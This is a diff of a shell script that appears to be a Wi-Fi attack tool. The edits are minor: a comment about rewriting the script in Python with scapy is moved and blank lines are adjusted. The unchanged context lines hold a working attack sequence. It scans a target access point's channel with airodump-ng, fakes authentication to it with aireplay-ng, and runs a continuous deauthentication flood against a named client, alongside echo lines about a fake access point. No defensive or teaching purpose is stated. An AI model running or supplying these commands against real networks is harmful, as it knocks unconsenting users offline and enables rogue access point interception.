@@ -86,6 +86,12 @@ then
 fi
 
 
+# All this should be written in python using scapy, for now we will use aircrack-ng just to see if it works.
+
+
+
+
+
 # Scan the channel of the BSSID
 echo "Scanning channel $channel"
 airodump-ng $interface --bssid $assid --channel $channel
@@ -104,7 +110,7 @@ then
 fi
 
 
-# All this should be written in python using scapy, for now we will use aircrack-ng just to see if it works.
+
 
 # Fake an access point with assid as BSSID and channel as channel of the AP
 echo "Starting fake access point"
@@ -114,11 +120,9 @@ aireplay-ng -1 0 -a $assid -h $tarssid $interface
 
 
 
+
+
 # Deauthanticate the target
 echo "Deauthing target"
 aireplay-ng -0 0 -a $assid -h $tarssid $interface
-
-
-
-
 
